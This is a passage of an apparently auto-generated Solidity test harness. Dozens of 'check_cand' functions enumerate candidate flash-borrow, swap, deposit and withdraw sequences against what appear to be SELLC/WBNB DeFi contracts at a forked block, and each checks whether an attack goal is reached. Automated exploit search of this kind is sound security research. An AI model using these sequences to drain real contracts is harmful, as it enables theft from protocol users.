        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        payback_sellc_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        payback_sellc_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        payback_sellc_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        payback_sellc_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        swap_pair_attacker_sellc_wbnb(amt1, amt2);
        deposit_srouter_wbnb_sellc(amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        swap_pair_attacker_sellc_wbnb(amt4, amt5);
        deposit_srouter_wbnb_sellc(amt6);
        payback_sellc_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        payback_sellc_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        swap_pair_attacker_wbnb_sellc(amt2, amt3);
        withdraw_srouter_sellc_wbnb(amt4);
        deposit_srouter_wbnb_sellc(amt5);
        payback_sellc_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        payback_sellc_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        payback_sellc_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt8 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        payback_sellc_owner(amt8);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        payback_sellc_owner(amt6);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        payback_sellc_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_sellc_owner(amt0);
        withdraw_srouter_sellc_wbnb(amt1);
        deposit_srouter_wbnb_sellc(amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        payback_sellc_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        swap_pair_attacker_sellc_wbnb(amt7, amt8);
        deposit_srouter_wbnb_sellc(amt9);
        withdraw_srouter_sellc_wbnb(amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        withdraw_srouter_sellc_wbnb(amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        deposit_srouter_wbnb_sellc(amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        swap_pair_attacker_wbnb_sellc(amt5, amt6);
        withdraw_srouter_sellc_wbnb(amt7);
        deposit_srouter_wbnb_sellc(amt8);
        withdraw_srouter_sellc_wbnb(amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand056(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        withdraw_srouter_sellc_wbnb(amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand057(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand058(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        withdraw_srouter_sellc_wbnb(amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand059(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand060(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        withdraw_srouter_sellc_wbnb(amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        swap_pair_attacker_sellc_wbnb(amt3, amt4);
        deposit_srouter_wbnb_sellc(amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand063(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        swap_pair_attacker_wbnb_sellc(amt8, amt9);
        withdraw_srouter_sellc_wbnb(amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand064(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand065(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        swap_pair_attacker_sellc_wbnb(amt6, amt7);
        deposit_srouter_wbnb_sellc(amt8);
        withdraw_srouter_sellc_wbnb(amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand066(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand067(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        withdraw_srouter_sellc_wbnb(amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand068(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand069(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand070(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        swap_pair_attacker_wbnb_sellc(amt4, amt5);
        withdraw_srouter_sellc_wbnb(amt6);
        deposit_srouter_wbnb_sellc(amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand071(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        swap_pair_attacker_sellc_wbnb(amt9, amt10);
        payback_wbnb_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand072(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        swap_pair_attacker_wbnb_sellc(amt7, amt8);
        withdraw_srouter_sellc_wbnb(amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand073(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand074(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        swap_pair_attacker_sellc_wbnb(amt5, amt6);
        deposit_srouter_wbnb_sellc(amt7);
        withdraw_srouter_sellc_wbnb(amt8);
        payback_wbnb_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand075(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_wbnb_owner(amt0);
        swap_pair_attacker_wbnb_sellc(amt1, amt2);
        withdraw_srouter_sellc_wbnb(amt3);
        deposit_srouter_wbnb_sellc(amt4);
        withdraw_srouter_sellc_wbnb(amt5);
        swap_pair_attacker_wbnb_sellc(amt6, amt7);
        swap_pair_attacker_sellc_wbnb(amt8, amt9);
        payback_wbnb_owner(amt10);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand076(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
